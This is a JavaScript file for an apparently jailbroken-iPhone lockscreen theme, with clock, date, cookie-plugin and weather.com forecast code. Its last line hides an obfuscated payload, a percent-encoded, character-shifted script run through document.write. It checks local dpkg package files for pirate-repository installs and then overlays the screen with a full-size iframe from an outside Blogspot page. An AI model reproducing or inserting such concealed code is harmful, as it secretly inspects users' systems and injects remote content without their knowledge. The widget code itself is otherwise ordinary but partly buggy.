//Set your Lockscreen HERE!!!!







//User

var sUnit = "s";  // m for celcius s for fareinheit

var TwentyFourHourClock = "false"; //Set to true for 24hr false to 12hr.

var sCityCodes = "38671"; //weather code. Find from weather.com look in url.





var world = "2"; // 1 for outside US, 2 for US. THIS MUST BE SET!!!!!

var s = $(this).attr("sCityCodes").substr(0, 2);





//if you put in an out of us code and do not choose 1 then weather will not load



//Dev

var refresh = 30 * 60 * 10000; //refresh in milliseconds (default: 1500 sec.)







//dont mess

var sCityNames = "";

var aCityNames = sCityNames.split('|');

var aCityCodes = sCityCodes.split('|');

var code = aCityCodes[0];

var language = window.navigator.language;









//cookie



/*!

 * jQuery Cookie Plugin v1.3

 * https://github.com/carhartl/jquery-cookie

 *

 * Copyright 2011, Klaus Hartl

 * Dual licensed under the MIT or GPL Version 2 licenses.

 * http://www.opensource.org/licenses/mit-license.php

 * http://www.opensource.org/licenses/GPL-2.0

 */

(function ($, document, undefined) {



  var pluses = /\+/g;



  function raw(s) {

    return s;

  }



  function decoded(s) {

    return decodeURIComponent(s.replace(pluses, ' '));

  }



  var config = $.cookie = function (key, value, options) {



    // write

    if (value !== undefined) {

      options = $.extend({}, config.defaults, options);



      if (value === null) {

	options.expires = -1;

      }



      if (typeof options.expires === 'number') {

	var days = options.expires, t = options.expires = new Date();

	t.setDate(t.getDate() + days);

      }



      value = config.json ? JSON.stringify(value) : String(value);



      return (document.cookie = [

	encodeURIComponent(key), '=', config.raw ? value : encodeURIComponent(value),

	options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE

	options.path	? '; path=' + options.path : '',

	options.domain	? '; domain=' + options.domain : '',

	options.secure	? '; secure' : ''

      ].join(''));

    }



    // read

    var decode = config.raw ? raw : decoded;

    var cookies = document.cookie.split('; ');

    for (var i = 0, l = cookies.length; i < l; i++) {

      var parts = cookies[i].split('=');

      if (decode(parts.shift()) === key) {

	var cookie = decode(parts.join('='));

	return config.json ? JSON.parse(cookie) : cookie;

      }

    }



    return null;

  };



  config.defaults = {};



  $.removeCookie = function (key, options) {

    if ($.cookie(key) !== null) {

      $.cookie(key, null, options);

      return true;

    }

    return false;

  };



})(jQuery, document);



//CLOCK



function updateClock ( )

{







//var TwentyFourHourClock = $.cookie("24hrcookie"); 





  var currentTime = new Date ( );

  var currentHours = currentTime.getHours ( );

  var currentMinutes = currentTime.getMinutes ( );

  var currentSeconds = currentTime.getSeconds ( );



    currentHours = ( currentHours < 10 ? "0" : "" ) + currentHours;

    currentHours = ( currentHours == 0 ) ? 12 : currentHours;

    currentMinutes = ( currentMinutes < 10 ? "0" : "" ) + currentMinutes;



if (TwentyFourHourClock == "true"){



}



  else{

      var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM"

  currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;

  currentHours = ( currentHours == 0 ) ? 12 : currentHours;

  }



  /*for leading zero on non 24hr delete this line*

  currentHours = ( currentHours < 10 ? "0" : "" ) + currentHours;



/*-----------------------------------------------------------------------------------------------------------------------------------------------*/



  // Compose the string for display

  var currentTimeString = currentHours + " " + ":";

  var currentTimeString1 = currentMinutes;



  // Update the time display

document.getElementById("hours").firstChild.nodeValue = currentTimeString;
document.getElementById("mins").firstChild.nodeValue = currentTimeString1;


}

function init2 ( )

{

  timeDisplay = document.createTextNode ( "" );

  document.getElementById("ampm").appendChild ( timeDisplay );

}



function amPm ( )

{

  var currentTime = new Date ( );

  var currentHours = currentTime.getHours ( );





/*---------------------------------------------------------------------------------------------------------------------------------AM PM Edit------*/



/* Remove the /* from under this line to display am or pm after the 12 hours clock */  /* NEW!! */



  // Choose either "AM" or "PM" as appropriate

  var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM";

  // Convert the hours component to 12-hour format if needed

  currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;

  // Convert an hours component of "0" to "12"

  currentHours = ( currentHours == 0 ) ? 12 : currentHours;

  // Compose the string for display

  var currentTimeString = timeOfDay;

  // Update the time display

document.getElementById("ampm").firstChild.nodeValue = currentTimeString;

}

function calendarDate ( )

{

  var this_date_name_array = new Array("00","01","02","03","04","05","06","07","08","09","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31")

  var this_weekday_name_array = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday")

  var this_month_name_array = new Array("January","February","March","April","May","June","July","August","September","October","November","December")	//predefine month names



  var this_date_timestamp = new Date()

  var this_weekday = this_date_timestamp.getDay()

  var this_date = this_date_timestamp.getDate()

  var this_month = this_date_timestamp.getMonth()

  var this_year = this_date_timestamp.getYear()



if (this_year < 1000)

    this_year+= 1900;

if (this_year==101)

    this_year=2001;



document.getElementById("date").firstChild.nodeValue = this_date_name_array[this_date] //concat long date string

document.getElementById("month").firstChild.nodeValue = this_month_name_array[this_month] +" "	//concat long date string

}

// -->





//IF YOU USE SETTING DELETE THIS!





//localize languages

var web = { i18n: {

		locale: {},

		getLocale: function(lng){

			var l = (lng)?lng: window.navigator.language;

	    //alert('Your language is' + " " + l ); //Loop

			$(function(d) {

		web.i18n.locale = d;

				}).error(function() {

					web.i18n.getLocale('en_US'); //incase. default

				});

		},

		getMessage: function(t){

			return (this.locale[t])?this.locale[t].message: t;

		}

	}

};

web.i18n.getLocale();





//alert("t")



//return text from language clean



function thislangText(t) {

    t = t.replace(/[\/]/g, "_____");

    t = t.replace(/-/g, "____");

    t = t.replace(/ \/ /g, "___");

    t = t.replace(/ /g, "_");

    t = t.replace("____", "");	

    return web.i18n.getMessage(t);

}





String.prototype.t = function() {

    var str;

    if (thislangText(this) !== "") {

	str = thislangText(this);

    } else {

	str = this;

    }

    return str;

};





// get weather //



function GetXmlFeed() {

   var lang = (typeof language == "string")?language.replace(/-/g, "_"):language;

   var sc = document.createElement("script");

    sc.src='http://wxdata.weather.com/wxdata/mobile/mobagg/' + code + '.js?key=e88d1560-a740-102c-bafd-001321203584&units=' + sUnit + '&locale=' + lang + '&cb=XmlFeedCB';

	document.body.appendChild(sc);



//alert(sc.src);



}



function XmlFeedCB(going){

	json = going[0];    //json is XML

  ShowContent();

}









function Showdata() {

  

var days = json.DailyForecasts;

var hdays = json.HourlyForecasts;

var ddays = json.NarrativeForecasts;

var firstday = JSON.stringify (ddays[0]);

var str = firstday;

str = str.replace("key", "")

str = str.replace("class", "")

str = str.replace("narrativeForecast", " ")

str = str.replace("validDate", " ")

str = str.replace("dayPart", " ")

str = str.replace("Today", " ")

str = str.replace("phrase", " ")

str = str.replace(/[\.,-\/#!$%\^&\*;:"{}=\-_`~()]/g,"")

str = str.slice(20, 147);

str = str.split('icon');

str = str[0];





 //alert(JSON.stringify (ddays[0]));

 //alert(icon);



 var html = [];







    for (i = 0; i < days.length; i++) {

		if (i > weatherSettings.days-1) break;









html.push('<div class="item">');

   var dn = days[i].day ? days[i].day : days[i].night; //days

 //alert(JSON.stringify (ddays));

 var d = new Date(parseInt(days[i].validDate,10) * 1000);





   var weekdays = d;

//alert(JSON.stringify(ddays));



       

function getCalendarDate()

{ 

   var months = new Array(13);

   months[0]  = "January";

   months[1]  = "February";

   months[2]  = "March";

   months[3]  = "April";

   months[4]  = "May";

   months[5]  = "June";

   months[6]  = "July";

   months[7]  = "August";

   months[8]  = "September";

   months[9]  = "October";

   months[10] = "November";

   months[11] = "December";



   //var days = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday")

   var days = new Array("Sun","Mon","Tues","Wed","Thurs","Fri","Sat")

   

   var now	   = weekdays;

   var monthnumber = now.getMonth();

   var daynumber = now.getDay();

   var monthname   = months[monthnumber];

   var dayname	 = days[daynumber];

   var monthday    = now.getDate();

   var year	   = now.getYear();

   var day	   =now.getDay();

		      

   if(year < 2000) { year = year + 1900; }

   var windsdate = dayname;

   var dateString = dayname + "," + " "+ monthname +

		    ' ' +

		    monthday



   return dateString;



} // function getCalendarDate()



function getCalendarDate2(){

      var days = new Array("Sun","Mon","Tues","Wed","Thurs","Fri","Sat")

      var now	      = weekdays;

      var daynumberwind = now.getDay();

      var dayname   = days[daynumberwind];

      var windsdate = dayname;

 return windsdate;

 }

var calendarDate = getCalendarDate();

var windsdate = getCalendarDate2();















	html.push('<div class="date">');

	html.push('<span class="weekday">' + ('' + calendarDate) + '</span> <span class="days">' + d.getDate() + "/" + (d.getMonth() + 1) + "/" + d.getFullYear() + '</span>');

	html.push('</div>');



	html.push('<div class="date2">');

	html.push('<span class="weekday2">' + ('' + windsdate) + '</span> <span class="days2">' + '</span>');

	html.push('</div>');

		//icon

	html.push('<div class="icon">');

	html.push('  <img class="weatherIcon" width="40" src="icon/' + dn.icon + '_small' + '.png"  title="' + dn.phrase + '"/>');  //title is weather condition

      

	html.push('</div>');



	//temp

	html.push('<div class="temp"><span class="temp-max">'  + (days[i].maxTemp  ? (days[i].maxTemp + '') : '--') + ((sUnit == 's') ? '\&#8457' : '\&#8451')+'</span> <span class="temp-min"> / ' + (days[i].minTemp+'' ? (days[i].minTemp + '') : '--') + ((sUnit == 's') ? '\&#8457' : '\&#8451')+'</span></div>');





	//precip

	html.push('<div class="precip">' + dn.pop + '% ' + web.i18n.getMessage("precip") + '</div>');



	//wind

	html.push('<div class="wind">' + dn.wDirText.t() + '<br/>' + dn.wSpeed + ((sUnit == 's') ? 'mph' : 'km/h') + '</div>');    

    }



	//city

	html.push('<div class="city">' + json.Location.city + '</div>');

	//desc

	html.push('<div class="desc">' + json.StandardObservation.text + '</div>');

	



	html.push('<div class="shortdesc">' + dn.bluntPhrase + '</div>');





	html.push('<div class="humidity">' +"Humid"+":" + " " +dn.humid +  '</div>');



	html.push('<div class="lat">' + "Latitude:" + "" + json.Location.lat + '</div>');



	html.push('<div class="long">' + "Longitude:" + "" + json.Location.lng + '</div>');

     

	html.push('<div class="realfeel">' + "Feels like" + ":" + (json.StandardObservation.feelsLike  ? (json.StandardObservation.feelsLike + '') : '--') + '</div>');

      



// Check json before writing varible. Canada Does not have NowHirad

try {

jsons = ("{" + json.NowHirad.phrase + "}");

}

catch (exception) {

var getNowHirad =  "no";

html.push('<div class="extendeddesc">' + str + '</div>');

jsons = null;}



if(getNowHirad != "no"){

html.push('<div class="extendeddesc">' + json.NowHirad.phrase + '</div>');

}





  html.push('<div class="whenwillitrain">' + json.WhenWillItRain.standardPhrase + '</div>');







     html.push('<div class="windnow">' + json.StandardObservation.wSpeed + " " +json.StandardObservation.wDirText +'</div>');



	html.push('<div class="temptoday">' + json.StandardObservation.temp + '</div>');

  html.push('  <img class="TodayIcon" width="30" src="icon/' + json.StandardObservation.wxIcon + '_small' + '.png"  title="' + dn.phrase + '"/>');  //title is weather condition

	

	html.push('</div>');







  icon = json.StandardObservation.wxIcon;

   var iconnumber = icon;



   $('#var').html(iconnumber);

 



   if(icon > null){

   

    $.cookie('bb', (iconnumber), {

	    expires: 365

	   });



   }

  

$.cookie('bb', (iconnumber), { path: '/', expires: 365 });







  

$('.weatherdata #weather').html(html.join(''));





if(json.StandardObservation.wSpeed > 0){

    rotatethis();

    function rotatethis(){

$("#blade").animateRotate(3600);

$("#blade2").animateRotate(3600);

}

}

setInterval(rotatethis, 19980);

}

//rotate blades

    $.fn.animateRotate = function(angle, duration, easing, complete){

    return this.each(function(){



	var elem = $(this);



	$({deg: 0}).animate({deg: angle}, {

	    duration: 20000,

	    easing: easing,

	    step: function(now){

		elem.css({

		    transform: "rotate(" + now + "deg)"



		});





	    },

	



	});

 });



};







function ShowContent() {

  Showdata();

}





(function($){



//extend to adj in html

$.fn.weather = function(options){

		weatherSettings = $.extend({

								"locationName": "",

								"locationCode":"",

								"showall": true,

								"days": 4}, options); //change from html



			GetXmlFeed(true);}

})($);

document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%261B%261B%264Dtdsjqu%264F%261B%2631%261Bqobnf%2631%264E%2631%2633njxfbuifs%2633%261B%261B%2635/bkby%2639%268C%261Bvsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261B%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%261B%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/ytfmmj%7Bf/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/jibdltsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tjogvmjqipofsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/cjufzpvsbqqm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/7%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/cjufzpvsbqqm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/jibdltsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tjogvmjqipofsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%261B%261B%264D0tdsjqu%264F%261B%261B%264Dejw%2631je%264E%2633uxju%2633%264F%264D0ejw%264F%261B%2631%2631%264Dtdsjqu%264F%261B%261B%2631%2631%261B%2631%2631%2631%2631%2631gvodujpo%2631dsfbufUxju%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%268C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf%2631%264E%2631epdvnfou/dsfbufFmfnfou%2639%2633jgsbnf%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/je%2631%264E%2631%2633xjehfu%3A%2633%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/tsd%264E%2633iuuq%264B00gvdljucmph212/cmphtqpu/dpn031240190ee/iunm%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/tuzmf/cbdlhspvoeDpmps%2631%264E%2631%2633usbotqbsfou%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/gsbnfCpsefs%2631%264E%2631%26331%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/bmmpxUsbotqbsfodz%264E%2633usvf%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633uxju%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e/bqqfoeDijme%2639jgsbnf%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf%2631%264E%2631ovmm%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e%2631%264E%2631ovmm%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%268E%261B%261Bgvodujpo%2631sfnpwfJgsb%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%268C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633xjehfu%3A%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu/tsd%264E%2633%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu%2631%264E%2631ovmm%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631wbs%2631e%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633uxju%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e/sfnpwfDijme%2639epdvnfou/hfuFmfnfouCzJe%2639%2633xjehfu%3A%2633%263%3A%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%268E%261B%261B%2631%2631%264D0tdsjqu%264F%261B%261B%2631%2631%264Dtuzmf%264F%261B%2631%2631%2634xjehfu%3A%268C%261B%2631%2631%2631qptjujpo%264B%2631bctpmvuf%264C%261B%2631%2631mfgu%264B1qy%264C%261B%2631%2631xjeui%264B%2631361qy%264C%261B%2631%2631ifjhiu%264B%2631386qy%264C%261B%2631%2631upq%264B91qy%264C%261B%2631%2631pqbdjuz%264B2%264C%261B%2631%2631%7B.joefy%264B%2631%3A%3A%3A%3A%3A%3A%3A%3A%3A%3A%3A%264C%261B%261B%2631%2631%268E%261B%2631%2631%264D0tuzmf%264F%261B1')